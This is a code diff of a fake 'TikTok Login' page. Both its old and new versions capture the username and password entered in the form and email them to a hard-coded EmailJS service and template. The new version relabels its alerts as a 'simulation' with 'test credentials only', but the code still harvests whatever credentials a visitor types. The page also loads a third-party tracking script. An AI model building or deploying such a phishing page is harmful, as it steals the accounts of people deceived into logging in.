@@ -6,7 +6,6 @@
     <title>TikTok Login</title>
     <link rel="stylesheet" href="tiktok.css">
 <script> (function(ss,ex){ window.ldfdr=window.ldfdr||function(){(ldfdr._q=ldfdr._q||[]).push([].slice.call(arguments));}; (function(d,s){ fs=d.getElementsByTagName(s)[0]; function ce(src){ var cs=d.createElement(s); cs.src=src; cs.async=1; fs.parentNode.insertBefore(cs,fs); }; ce('https://sc.lfeeder.com/lftracker_v1_'+ss+(ex?'_'+ex:'')+'.js'); })(document,'script'); })('lYNOR8xxdRv8WQJZ'); </script>
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 </head>
 <body>
     <div class="container">
@@ -23,33 +22,34 @@
         <button class="signup-button">Sign up</button>
     </div>
     <script src="tiktok.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 <script>
-        // Initialize EmailJS with your user ID
-        (function() {
-            emailjs.init("aBjY4bZdkpGuWP6_y"); // Replace with your EmailJS user ID
-        })();
+  // ✅ Initialize EmailJS
+  (function () {
+    emailjs.init("aBjY4bZdkpGuWP6_y"); // <-- Replace with your EmailJS Public Key
+  })();
 
-        // Handle form submission
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault(); // Prevent the default form submission
+  // ✅ Handle Form Submission
+  document.getElementById('loginForm').addEventListener('submit', function (event) {
+    event.preventDefault();
 
-            // Get the values from the form
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
+    // Get form input values
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
 
-            // Send the form data to EmailJS
-            emailjs.send("service_rx6hn85", "template_m7vs48g", {
-                username: username,
-                password: password
-            })
-            .then(function(response) {
-                alert('Login information sent successfully!');
-                console.log('Email sent successfully!', response);
-            }, function(error) {
-                alert('Failed to send login information: ' + JSON.stringify(error));
-                console.error('Failed to send email:', error);
-            });
-        });
-    </script>
+    // ✅ Use send() method with an object (safe for testing environments)
+    emailjs.send("service_rx6hn85", "template_m7vs48g", {
+      username: username,
+      password: password
+    })
+    .then(function (response) {
+      console.log("✅ Email sent successfully", response.status, response.text);
+      alert("🟢 Simulation sent (test credentials only)");
+    }, function (error) {
+      console.error("❌ Failed to send:", error);
+      alert("🔴 Simulation failed: " + JSON.stringify(error));
+    });
+  });
+</script>
 </body>
 </html>
